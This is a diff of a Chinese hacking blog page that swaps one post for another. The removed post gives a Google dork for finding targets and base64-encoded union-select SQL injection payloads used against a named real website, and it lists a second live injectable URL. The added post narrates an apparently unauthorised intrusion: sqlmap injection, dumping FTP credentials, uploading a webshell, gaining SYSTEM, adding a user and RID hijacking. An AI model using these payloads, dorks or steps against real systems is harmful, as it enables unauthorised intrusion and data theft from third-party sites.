@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>base64变形注入 | 九世的博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="base64变形注入 | 九世的博客">
+  <title>一次浪荡的渗透2 | 九世的博客</title>
+  <meta name="keywords" content=" 渗透 ">
+  <meta name="description" content="一次浪荡的渗透2 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -903,19 +903,25 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-base64变形注入" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-一次浪荡的渗透2" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">base64变形注入</h1>
+        <h1 class="article-title">一次浪荡的渗透2</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color3">渗透</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-11-25 09:18</time>
+        创建时间:<time class="date" title="更新时间: 2019-07-27 22:46:46">2019-07-27 22:18</time>
         
     </div>
     <div class="article-meta">
@@ -937,7 +943,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -952,26 +958,25 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>逛RSS的时候发现一个叫base64注入的文章，后面上google查了一下，就是在base64编码的情况下会造成注入，思路还是一样的<br><img src="https://s1.ax1x.com/2018/11/25/FkeA5q.jpg" alt="FkeA5q.jpg"></p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>上google搜：inurl:.php?id=MTM intext:公司就可以找到很多注入点<br>这里拿其中一个来做例子：</p>
-<p>测试链接：<a href="http://www.ccctawau.org/eventinfo.php?id=MTM" target="_blank" rel="noopener">斗湖中华商会</a><br>判断是否存在注入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13 and 1=2 | MTMgYW5kIDE9Mg==</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/11/25/FkeBdA.png" alt="FkeBdA.png"></p>
-<p>获取位数(得到11位)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13 order by 11 | MTMgb3JkZXIgYnkgMTI=</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/11/25/Fke2QS.md.png" alt="Fke2QS.md.png"></p>
-<p>获取显位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2,3,4,5,6,7,8,9,10,11 | MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTE=</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/11/25/FkeWLQ.md.png" alt="FkeWLQ.md.png"></p>
-<p>获取数据库用户名，数据库版本，数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2,version(),database(),5,6,7,8,9,user(),11|MCB1bmlvbiBzZWxlY3QgMSwyLHZlcnNpb24oKSxkYXRhYmFzZSgpLDUsNiw3LDgsOSx1c2VyKCksMTE=</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/11/25/FkeTJ0.png" alt="FkeTJ0.png"></p>
-<p>获取表名，然而好像出现了什么问题..</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2,table_name,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema=0x43434354415741555F4F52474442|MCB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyw4LDksMTAsMTEgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0weDQzNDM0MzU0NDE1NzQxNTU1RjRGNTI0NzQ0NDI=</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/11/25/FkmSF1.png" alt="FkmSF1.png"></p>
-<p>找了一下问题好像是因为上面编码问题…然后想了一下也搞不了，就到此结束吧….<br>这个站有phpmyadmin，应该可以爆破一波然后通过phpmyadmin进行getshell，当然如果能爆出路径直接getshell就好</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里在提供一个站，没什么东西就个id表..:[�������ӻ���](http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3)</span><br></pre></td></tr></table></figure>
-<p><a href="http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3" target="_blank" rel="noopener">http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3</a><br>转载请声明：转自422926799.github.io</p>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=415593530&auto=1&height=66"></iframe>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看了freebuf某篇文章想试验一下，上网找了几个站。然后发现这个站有SQL注入就顺手拿下了<br><img src="https://s2.ax1x.com/2019/07/27/eM5mdO.png" alt="eM5mdO.png"></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>由于那个站已经死了，我当时没截图。就简单描述一下当时的情况。大约在找回用户名处插入了’发现有SQL注入<br><img src="https://s2.ax1x.com/2019/07/27/eMIAhQ.png" alt="eMIAhQ.png"></p>
+<p>POST抓包扔sqmap一套带走<br><img src="https://s2.ax1x.com/2019/07/27/eMID4e.png" alt="eMID4e.png"></p>
+<p>sqlmap<br><img src="https://s2.ax1x.com/2019/07/27/eMI6gA.png" alt="eMI6gA.png"></p>
+<p>后面看到有个叫ftpmg的数据库，当时就觉得这是FTP的用户名和密码，就先跑了出来<br><img src="https://s2.ax1x.com/2019/07/27/eMTBSH.png" alt="eMTBSH.png"></p>
+<p>由于数据库的权限是dba权限，把用户名和密码也跑了<br><img src="https://s2.ax1x.com/2019/07/27/eMTRk8.png" alt="eMTRk8.png"></p>
+<p>虽然知道数据库密码，但是mysql不允许外连<br><img src="https://s2.ax1x.com/2019/07/27/eMTb7V.png" alt="eMTb7V.png"></p>
+<p>也不知道物理路径，没办法os-shell，后面就跑了一下这个站的数据库，打算进后台<br><img src="https://s2.ax1x.com/2019/07/27/eM7SXR.png" alt="eM7SXR.png"></p>
+<p>问题是，md5一个也查不出来<br><img src="https://s2.ax1x.com/2019/07/27/eM79n1.jpg" alt="eM79n1.jpg"></p>
+<p>7kb的扫描工具就扫出一个robots.txt..<br><img src="https://s2.ax1x.com/2019/07/27/eM79n1.jpg" alt="eM79n1.jpg"></p>
+<p>无计可施的试了一下ftp，我草还真登录上去了<br><img src="https://s2.ax1x.com/2019/07/27/eM7V9e.png" alt="eM7V9e.png"></p>
+<p>找到站点根目录，二话不说扔了个shell上去，菜刀链接<br><img src="https://s2.ax1x.com/2019/07/27/eM734S.png" alt="eM734S.png"></p>
+<p>一查权限system<br><img src="https://s2.ax1x.com/2019/07/27/eM5mdO.png" alt="eM5mdO.png"></p>
+<p>打了200多个补丁…<br><img src="https://s2.ax1x.com/2019/07/27/eMHEV0.png" alt="eMHEV0.png"></p>
+<p>添加用户+RID劫持获取管理员全部数据<br><img src="https://s2.ax1x.com/2019/07/27/eMHVaV.md.png" alt="eMHVaV.md.png"></p>
+<p>查了一下这个站的旁站居然是搞棋牌的….<br><img src="https://s2.ax1x.com/2019/07/27/eMHXQJ.md.png" alt="eMHXQJ.md.png"></p>
+<p>微步查了一下<br><img src="https://s2.ax1x.com/2019/07/27/eMbnTP.png" alt="eMbnTP.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -981,12 +986,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>base64变形注入</p>
+    <p><span class="copy-title">文章标题:</span>一次浪荡的渗透2</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-11-25, 09:18:57</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3975ae51.html" title="base64变形注入">http://422926799.github.io/posts/3975ae51.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-07-27, 22:18:28</p>
+    <p><span class="copy-title">最后更新:</span>2019-07-27, 22:46:46</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/7e2a8d8d.html" title="一次浪荡的渗透2">http://422926799.github.io/posts/7e2a8d8d.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
